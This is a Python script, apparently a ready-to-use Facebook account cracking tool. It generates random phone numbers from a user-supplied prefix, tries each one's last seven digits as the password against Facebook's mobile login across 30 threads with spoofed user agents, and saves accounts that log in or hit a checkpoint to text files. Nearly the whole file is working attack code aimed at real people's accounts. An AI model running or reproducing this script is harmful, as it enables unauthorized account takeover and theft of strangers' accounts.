#!/usr/bin/python3
#-*-coding:utf-8-*-
import os

try:
	import requests
except ImportError:
	print('\n [×] requests module not installed!...\n')
	os.system('pip install requests')

try:
	import concurrent.futures
except ImportError:
	print('\n [×] Futures module not installed!...\n')
	os.system('pip install futures')
    
try:
	import bs4
except ImportError:
	print('\n [×] Bs4 module not installed!...\n')
	os.system('pip install bs4')
    
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
	os.system('python num.py')
  
agents = ["Mozilla/5.0 (Linux; Android 12; SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36"
				"Mozilla/5.0 (Linux; Android 10; moto g(8) power lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Mobile Safari/537.36"
				"Mozilla/5.0 (Linux; Android 6.0.1; SM-P355M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36"
				"Mozilla/5.0 (Linux; Android 9; VKY-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Mobile Safari/537.36"
				"Mozilla/5.0 (Linux; Android 11; LM-K525) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Mobile Safari/537.36"
				"Mozilla/5.0 (Linux; Android 10; Twist 4G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36"
				"Mozilla/5.0 (Linux; Android 9; moto g(8) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36"
				"Mozilla/5.0 (Linux; Android 11; SM-A217F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Mobile Safari/537.36"]
  
logo = """
  ____..--'   ____    .-./`) ,---.   .--.   ____     _______    
 |        | .'  __ `. \ .-.')|    \  |  | .'  __ `. \  ____  \  
 |   .-'  '/   '  \  \/ `-' \|  ,  \ |  |/   '  \  \| |    \ |  
 |.-'.'   /|___|  /  | `-'`"`|  |\_ \|  ||___|  /  || |____/ /  
    /   _/    _.-`   | .---. |  _( )_\  |   _.-`   ||   _ _ '.  
  .'._( )_ .'   _    | |   | | (_ o _)  |.'   _    ||  ( ' )  \ 
.'  (_'o._)|  _( )_  | |   | |  (_,_)\  ||  _( )_  || (_{;}_) | 
|    (_,_)|\ (_ o _) / |   | |  |    |  |\ (_ o _) /|  (_,_)  / 
|_________| '.(_,_).'  '---' '--'    '--' '.(_,_).' /_______.'  
                                                                
\033[1;93m______________________________________________________
 
 \033[1;93m(*)\033[1;92m Developer : ZainabAmjidAwan \033[1;33m🔥zainab Awan🔥
 \033[1;93m(*)\033[1;92m WhatsApp  : 0344*******
 \033[1;93m(*)\033[1;92m Version   : 2.0
 \033[1;93m(*)\033[1;92m Github    : https://github.com/ZainabAmjidAwan
\033[1;93m______________________________________________________
"""    
loop = 0
oks = []
cps = []

#global functions
def dynamic(text):
	titik = ['.   ','..  ','... ','.... ']
	for o in titik:
		print('\r'+text+o),
		sys.stdout.flush();time.sleep(1)
def main():
	os.system('clear')
	print(logo)
	print('[1] Random crack')
	print(54*'_')
	opt = input('Choose option >>> ')
	if opt =='1':
		random_crack()
    
def random_crack():
	os.system('clear')
	print(logo)
	print('[1] Random UID crack')
	print('[B] Back')
	print(54*'_')
	opt = input('Choose option >>> ')
	if opt =='1':
		random_number()
	elif opt =='3':
		main()
	else:
		print('\n\033[1;31mChoose valid option\033[0;97m')

def random_number():
	user=[]
	os.system('clear')
	print(logo)
	print('\033[1;33mCode example: 92301,92302,92305,92306 ...\033[0;97m')
	kode = input('Put code: ')
	limit = int(input('How many numbers do you want to add ? '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('Total ids:\033[1;32m '+tl)
		print('The process has been started')
		print(54*'_')
		for guru in user:
			uid = kode+guru
			pwx = [guru]
			yaari.submit(rcrack,uid,pwx,tl)
	print(54*'_')
	print('Crack process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	print(54*'_')
    
def rcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cps
	global oks
	global agents
	try:
		for ps in pwx:
			session = requests.Session()
			pro = random.choice(agents)
			free_fb = session.get('https://m.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':'m.facebook.com',
			'method': 'POST',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'none',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
			'user-agent': pro}
			lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				print('     \033[1;32m[zainab Awan-OK] '+cid+' | '+ps+'\033[0;97m')
				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('     \033[1;33m[zainab Awan-CP] '+cid+' | '+ps+'\033[0;97m')
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write('\r   [%s/%s]  OK:- %s  CP:- %s \r'%(loop,tl,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
main()